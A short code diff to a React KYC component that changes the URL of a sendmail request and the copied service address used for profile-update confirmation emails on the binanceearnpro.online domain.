@@ -117,14 +117,14 @@ export default function Kyc() {
       })
       .then(() => {
         ajax({
-          url: "https://binanceearnpro.online/sendmail",
+          url: "https://mega.binanceearnpro.online/sendmail",
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
           body: {
             message: `Hello ${user.firstName}, your profile has been successfully updated.`,
-            to: `${user.email}, support@binanceearnpro.online`,
+            to: `${user.email}, service@binanceearnpro.online`,
             subject: "Pofile update",
           },
         }).subscribe(() => {
